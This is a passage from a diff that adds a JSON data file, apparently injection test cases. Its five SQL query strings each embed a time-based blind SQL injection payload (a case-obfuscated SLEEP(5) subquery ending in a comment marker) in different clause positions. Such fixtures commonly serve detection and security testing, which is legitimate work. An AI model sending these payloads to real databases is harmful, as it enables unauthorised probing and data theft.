+                "SELECT * FROM users ORDER BY ' ANd (SElEcT 1 frOM (selECT(slEEP(5)))a)--  DESC",
+                "SELECT * FROM ' ANd (SElEcT 1 frOM (selECT(slEEP(5)))a)--  WHERE active = 1",
+                "SELECT * FROM users WHERE ' ANd (SElEcT 1 frOM (selECT(slEEP(5)))a)--  IS NOT NULL",
+                "SELECT ' ANd (SElEcT 1 frOM (selECT(slEEP(5)))a)--  FROM users",
+                "SELECT * FROM users ORDER BY id ' ANd (SElEcT 1 frOM (selECT(slEEP(5)))a)-- "
+            ]
+        }
+    }
+]
